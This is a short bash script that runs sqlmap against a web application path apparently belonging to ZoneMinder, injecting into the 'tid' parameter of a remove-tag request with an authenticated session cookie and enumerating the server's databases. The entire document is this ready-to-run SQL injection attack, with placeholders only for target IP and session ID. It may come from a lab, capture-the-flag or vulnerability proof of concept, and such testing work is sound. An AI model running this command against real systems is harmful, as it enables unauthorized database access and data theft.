#!/bin/bash

sqlmap -u 'http://[TARGET_IP]/zm/index/index.php?view=request&request=event&action=removetag&tid=1' \
    --cookie 'ZMSESSID=[session_ID_here]' \
    -p tid --dbms=mysql --batch --dbs

